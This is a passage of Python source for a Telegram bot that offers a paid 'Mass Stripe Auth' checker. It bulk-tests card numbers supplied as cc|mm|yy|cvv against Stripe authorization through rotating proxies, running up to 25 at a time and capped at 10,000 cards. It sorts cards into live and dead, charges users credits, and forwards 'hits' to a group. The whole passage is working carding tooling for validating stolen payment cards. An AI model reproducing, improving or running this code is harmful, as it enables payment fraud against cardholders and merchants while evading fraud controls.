            await callback.message.answer(f"❌ Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
        except:
            pass

@router.callback_query(MchkStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MchkStopCallback):
    try:
        session_id = callback_data.session_id
        session = MCHK_SESSIONS.get(session_id)
        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True)
            return

        if is_buttons_locked(session_id):
            remaining = get_remaining_lock(session_id)
            await callback.answer(f"⏳ Please wait {remaining} seconds before using buttons", show_alert=True)
            return

        if session['status'] != "<b>Cʜᴇᴄᴋɪɴɢ…</b>":
            await callback.answer("ℹ️ Not running", show_alert=True)
            return

        session['status'] = "<b>Sᴛᴏᴘᴘᴇᴅ</b>"
        print(f"🛑 [MCHK] Stop signal sent")
        logging.info(f"🛑 [MCHK] Stop signal sent")

        cancelled_count = 0
        for task in session.get('tasks', []):
            if not task.done():
                task.cancel()
                cancelled_count += 1

        await callback.answer("🛑 Stopping...", show_alert=False)
        print(f"🛑 [MCHK] Cancelled {cancelled_count} tasks")
        logging.info(f"🛑 [MCHK] Cancelled {cancelled_count} tasks")

        session['last_text'] = ""
        await update_progress_message(callback.bot, session_id)

    except Exception as e:
        logging.error(f"Error handling MCHK stop callback: {e}", exc_info=True)
        try:
            await callback.answer("❌ Error stopping", show_alert=True)
        except:
            pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD PROCESSING (UPDATED)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name):
    """
    Process a single card using stripeauth.py which handles its own proxy rotation.
    """
    check_started = time.time()
    session = MCHK_SESSIONS.get(session_id)
    if not session or is_session_stopped(session_id):
        return

    result_status = "ERROR"
    response_msg = "Unknown Error"
    api_price = "0.00"
    api_currency = "USD"

    try:
        # Call with use_proxy=True (default) - stripeauth handles proxies internally
        api_result = await process_stripe_auth(cc_formatted, use_proxy=True)
        result_status = api_result.get("status", "error").upper()
        response_msg = api_result.get("response", "Unknown Error")
        api_price = api_result.get("price", "0.00")
        api_currency = api_result.get("currency", "USD")
    except asyncio.TimeoutError:
        result_status = "TIMEOUT"
        response_msg = "Timeout"
    except Exception as e:
        result_status = "ERROR"
        response_msg = f"Connection Error: {str(e)[:50]}"
        print(f"[MCHK ERROR] {cc_formatted} -> {e}")

    if is_session_stopped(session_id):
        return

    try:
        bin_data = await get_bin_info(cc_num[:6])
    except:
        bin_data = {}

    if is_session_stopped(session_id):
        return

    print(f"[MCHK] {cc_formatted} | {result_status} | {response_msg}")
    logging.info(f"[MCHK] {cc_formatted} | {result_status} | {response_msg}")

    session['checked'] += 1

    elapsed = time.time() - check_started
    card_result_data = {
        'time_take': elapsed,
        'card': cc_formatted,
        'response': response_msg,
        'bin_info': bin_data,
        'price': api_price,
        'currency': api_currency,
        'gateway': 'Stripe Auth',
        'timestamp': datetime.now().isoformat()
    }

    if is_session_stopped(session_id):
        return

    # Handle different result statuses
    if result_status in ["HTTP_ERROR", "TIMEOUT", "ERROR"]:
        session['errors'] += 1
        session['error_cards'].append(card_result_data)

    elif result_status in ["APPROVED", "CHARGED"]:
        # APPROVED/CHARGED means charged/approved in stripeauth
        session['charged'] += 1
        session['charged_cards'].append(card_result_data)

        await asyncio.gather(
            asyncio.to_thread(update_user_stats, user_id, True),
            asyncio.to_thread(increment_lifetime_stats, user_id, 1, 0, 0),
            asyncio.to_thread(log_hit_to_mchk, user_id, user_obj.username, user_obj.first_name),
            asyncio.to_thread(deduct_credits_atomic, user_id, 2),
        )

        if is_session_stopped(session_id):
            return

        await asyncio.gather(
            send_hit_log_to_group(bot, response_msg, user_obj, plan_name, api_price, api_currency),
            send_charged_msg_to_user(
                bot, cc_formatted, response_msg, bin_data,
                user_obj, plan_name, api_currency, elapsed
            ),
        )

    elif result_status == "DECLINED":
        session['dead'] += 1
        session['dead_cards'].append(card_result_data)

        await asyncio.gather(
            asyncio.to_thread(update_user_stats, user_id, False),
            asyncio.to_thread(increment_lifetime_stats, user_id, 0, 0, 1),
            asyncio.to_thread(deduct_credits_atomic, user_id, 1),
        )

    if is_session_stopped(session_id):
        return
    
    if session['checked'] % 3 == 0 or session['checked'] == session['total']:
        await update_progress_message(bot, session_id)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/mchk"))
async def mchk_command(message: types.Message):
    # ── Gate Check ──
    if not await asyncio.to_thread(is_gate_enabled, "mchk"):
        await message.reply("🚧 <b>𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
        return

    user = message.from_user
    user_id = user.id
    bot = message.bot

    # ── PREMIUM ONLY CHECK ──
    is_premium, _ = get_premium_status(user_id)
    if not is_premium:
        await message.reply(
            "<b>💎 Pʟᴇᴀsᴇ Uᴘɢʀᴀᴅᴇ Yᴏᴜʀ Pʟᴀɴ Tᴏ Usᴇ Tʜɪs Fᴇᴀᴛᴜʀᴇ.</b>\n\n👉 <b>Usᴇ /plan Tᴏ Uᴘɢʀᴀᴅᴇ.</b>",
            parse_mode="HTML"
        )
        return

    # ── CHECK FOR ACTIVE SESSION ──
    is_checking = False
    for session_id, session_data in list(MCHK_SESSIONS.items()):
        if session_data.get('user_id') == user_id and session_data.get('status') == "<b>Cʜᴇᴄᴋɪɴɢ…</b>":
            is_checking = True
            break

    if is_checking:
        await message.reply(
            "⚠️ <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻</b>\n\n"
            "You have a check running.\n"
            "Use the <b>🛑 Stop</b> button to stop it.",
            parse_mode="HTML"
        )
        return

    # ── EXTRACT CARDS FROM MESSAGE ──
    raw_text = ""
    if len(message.text.split()) > 1:
        raw_text += " ".join(message.text.split()[1:]) + " "

    if message.reply_to_message:
        replied_msg = message.reply_to_message
        if replied_msg.text:
            raw_text += replied_msg.text + " "
        elif replied_msg.caption:
            raw_text += replied_msg.caption + " "

    document = message.document
    if not document and message.reply_to_message and message.reply_to_message.document:
        document = message.reply_to_message.document

    if document:
        if document.file_size > 5 * 1024 * 1024:
            await message.reply("❌ File too large. Max 5MB.")
            return
        try:
            file = await bot.get_file(document.file_id)
            byte_io = await bot.download_file(file.file_path)
            raw_text += byte_io.read().decode('utf-8', errors='ignore')
        except Exception as e:
            await message.reply(f"❌ Error reading file: {e}")
            return

    if not raw_text.strip():
        await message.reply(
            "❌ <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n"
            "• <code>/mchk cc|mm|yy|cvv</code>\n"
            "• Reply to cards with <code>/mchk</code>\n"
            "• Send .txt file with <code>/mchk</code>",
            parse_mode="HTML"
        )
        return

    extracted_cards = extract_cards_from_text(raw_text)
    if not extracted_cards:
        await message.reply("❌ No valid card formats found.")
        return

    valid_cards = []
    expired_count = 0
    invalid_luhn_count = 0
    MAX_VALID_CARDS = 10000

    for card_string in extracted_cards:
        if len(valid_cards) >= MAX_VALID_CARDS:
            break
        parts = card_string.split('|')
        if len(parts) != 4:
            continue
        cc, mm, yy, cvv = parts
        if not luhn_check(cc):
            invalid_luhn_count += 1
            continue
        # Check expiry
        try:
            current_date = datetime.now()
            current_year = current_date.year % 100
            current_month = current_date.month
            exp_year = int(yy)
            exp_month = int(mm)
            if exp_year < current_year or (exp_year == current_year and exp_month < current_month):
                expired_count += 1
                continue
        except:
            expired_count += 1
            continue
        valid_cards.append((card_string, cc))

    total_cards = len(valid_cards)
    if total_cards == 0:
        filter_info = ""
        if expired_count > 0 or invalid_luhn_count > 0:
            filter_info = f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n"
        await message.reply(f"{filter_info}❌ No valid cards to check.", parse_mode="HTML")
        return

    # ── Credit check: user must have at least 1 credit per card ──
    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits < total_cards:
        await message.reply(
            f"❌ <b>𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗿𝗲𝗱𝗶𝘁𝘀</b>\n\n"
            f"You need <b>{total_cards}</b> credits to check <b>{total_cards}</b> cards.\n"
            f"Your balance: <b>{current_credits}</b> credits.\n\n"
            f"Please add more credits or reduce the number of cards.",
            parse_mode="HTML"
        )
        return

    session_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name = await get_user_plan_name(user_id)
    is_group = message.chat.type in ("group", "supergroup", "channel")

    initial_text = (
        f"<a href='https://t.me/broken_wiz'>[᯼]</a> <b>Gᴀᴛᴇ ➺</b> <b>Sᴛʀɪᴘᴇ Aᴜᴛʜ | Mass</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"      <a href='https://t.me/broken_wiz'>[◈]</a> <b>Sᴛᴀᴛᴜs ➺</b> Cʜᴇᴄᴋɪɴɢ… <tg-emoji emoji-id=\"6253754970349243649\">✨</tg-emoji>\n"
        f"      <a href='https://t.me/broken_wiz'>[ᱯ]</a> <b>Sᴇssɪᴏɴ ID ➺</b> <code>{session_id}</code>\n"
        f"━━━━━━━━━━━━━━\n"
        f"<b>Cʜᴇᴄᴋᴇᴅ ➺</b> <code>「 0/{total_cards} 」</code>\n"        
        f"♘ <b>ᎪꮲꮲꭱƦꮎꮩꭼꭰ ➺</b> <b>0</b> <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>\n"
        f"♞ <b>ᏟꮋꭺꭱƦᏽꭼꭰ ➺</b> <b>0</b> <tg-emoji emoji-id=\"5427168083074628963\">💎</tg-emoji>\n"
        f"<b>Dᴇᴄʟɪɴᴇᴅ ➺</b> <b>0</b> <tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji>\n"        
        f"<b>Eʀʀᴏʀ ➺</b> <b>0</b> <tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji>\n"
        f"<b>Eʟᴀᴘsᴇᴅ ➺</b> <b>0s</b> <tg-emoji emoji-id=\"5258419835922030550\">🕔</tg-emoji>\n"
        f"<b>Dᴇᴠ ➺</b> <a href='https://t.me/broken_wiz'>𒉼 𝔦 乙</a> <tg-emoji emoji-id=\"5260681660189408650\">🏆</tg-emoji> <tg-emoji emoji-id=\"5429495925284296642\">🚬</tg-emoji>"
    )

    initial_buttons = get_result_buttons(session_id, is_running=True)
    progress_msg = await message.reply(
        initial_text, 
        parse_mode="HTML", 
        reply_markup=initial_buttons, 
        disable_web_page_preview=True
    )

    MCHK_SESSIONS[session_id] = {
        "session_id": session_id,
        "status": "<b>Cʜᴇᴄᴋɪɴɢ…</b>",
        "chat_id": message.chat.id,
        "user_id": user_id,
        "msg_id": progress_msg.message_id,
        "user_msg_id": message.message_id,
        "total": total_cards,
        "checked": 0,
        "approved": 0,
        "charged": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time(),
        "tasks": [],
        "last_text": "",
        "last_update_time": 0,
        "approved_cards": [],
        "charged_cards": [],
        "dead_cards": [],
        "error_cards": [],
        "user_obj": user,
        "plan_name": plan_name,
        "is_group": is_group,
    }

    print(f"🚀 [MCHK] Started - {total_cards} cards - User: {user_id} - Group: {is_group}")
    logging.info(f"🚀 [MCHK] Started - {total_cards} cards - User: {user_id} - Group: {is_group}")

    asyncio.create_task(run_mass_checker(bot, session_id, valid_cards, user, plan_name))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS CHECKER WORKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
    """
    Run mass checker with concurrency control.
    Each card processing uses stripeauth.py which handles its own proxy.
    """
    session = MCHK_SESSIONS.get(session_id)
    if not session:
        return

    sem = asyncio.Semaphore(25)

    async def worker(cc_formatted, cc_num):
        if is_session_stopped(session_id):
            return
        async with sem:
            if is_session_stopped(session_id):
                return
            try:
                await process_single_card(
                    session_id, cc_formatted, cc_num,
                    session['user_id'], bot, user_obj, plan_name
                )
            except asyncio.CancelledError:
                print(f"🛑 [MCHK] Task cancelled: {cc_formatted}")
                raise
            except Exception as e:
                if not is_session_stopped(session_id):
                    logging.error(f"Worker error for {cc_formatted}: {e}")

    tasks = []
    for cc_formatted, cc_num in cards:
        if is_session_stopped(session_id):
            print(f"🛑 [MCHK] Stopped creating tasks - {len(tasks)} created")
            break
        task = asyncio.create_task(worker(cc_formatted, cc_num))
        tasks.append(task)
        session['tasks'].append(task)

    print(f"📋 [MCHK] {len(tasks)} tasks created")
    logging.info(f"📋 [MCHK] {len(tasks)} tasks created")

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        cancelled = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
        errors = sum(1 for r in results if isinstance(r, Exception) and not isinstance(r, asyncio.CancelledError))

        if cancelled > 0:
            print(f"🛑 [MCHK] {cancelled} tasks cancelled")
        if errors > 0:
            logging.error(f"[MCHK] {errors} tasks failed with exceptions")

    session = MCHK_SESSIONS.get(session_id)
    if session and session['status'] != "<b>Sᴛᴏᴘᴘᴇᴅ</b>":
        session['status'] = "<b>Sᴜᴍᴍᴀʀʏ</b>"
        session['last_text'] = ""
        await update_progress_message(bot, session_id)
        print(f"✅ [MCHK] Completed - A:{session['approved']} C:{session['charged']} D:{session['dead']} E:{session['errors']}")
        logging.info(f"✅ [MCHK] Completed - A:{session['approved']} C:{session['charged']} D:{session['dead']} E:{session['errors']}")
    elif session and session['status'] == "<b>Sᴛᴏᴘᴘᴇᴅ</b>":
        print(f"🛑 [MCHK] Stopped - A:{session['approved']} C:{session['charged']} D:{session['dead']} Checked:{session['checked']}")
        logging.info(f"🛑 [MCHK] Stopped - A:{session['approved']} C:{session['charged']} D:{session['dead']} Checked:{session['checked']}")
